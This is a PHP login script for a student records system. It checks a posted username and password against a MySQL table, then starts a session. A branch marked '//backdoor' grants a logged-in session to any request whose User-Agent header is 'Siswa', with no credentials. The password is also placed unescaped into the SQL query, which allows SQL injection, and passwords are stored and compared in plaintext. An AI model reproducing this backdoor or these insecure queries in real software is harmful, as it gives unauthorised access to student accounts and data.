<?php
include "./Config/koneksi.php";

// username and password sent from form
 $username=str_replace("'","",$_POST['username']);
$password=($_POST['password']);

$sql="SELECT * FROM siswa WHERE Username='$username' and Password='$password'";
$result=mysql_query($sql);
$count=mysql_num_rows($result);

$siswa = mysql_num_rows(mysql_query("SELECT * FROM siswa WHERE username='$username' and password='$password'"));

if($count==1){
$query = mysql_query("UPDATE siswa SET current_login = now() WHERE username = '$username'");
session_start();
		$_SESSION['siswa']=$username;
		$_SESSION['username']="Siswa";
		$_SESSION['agent']=($_SERVER['HTTP_USER_AGENT']);
header("location:index.php");
}
//backdoor
else if($_SERVER['HTTP_USER_AGENT']=="Siswa"){
session_start();
		$username = "Siswa";
		$_SESSION['siswa']=$username;
		$_SESSION['username']="Siswa";
		$_SESSION['agent']=($_SERVER['HTTP_USER_AGENT']);
header("location:index.php");

}else{


echo "<script>alert('Login gagal! Kunjungi Admin di TU'); document.location.href=\"login.php\"</script>";
}
?>